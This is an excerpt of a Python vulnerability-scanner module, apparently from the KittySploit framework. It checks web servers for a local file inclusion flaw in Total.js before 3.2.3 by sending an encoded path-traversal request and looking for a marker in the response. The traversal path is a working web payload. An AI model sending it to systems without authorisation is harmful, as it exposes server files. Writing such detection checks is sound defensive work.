...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Totaljs <3.2.3 - Local File Inclusion Detection',
        'description': 'Total.js Platform before 3.2.3 is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'totaljs', 'lfi', 'node.js', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('apache2.conf',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Totaljs <3.2.3 - Local File Inclusion detected",
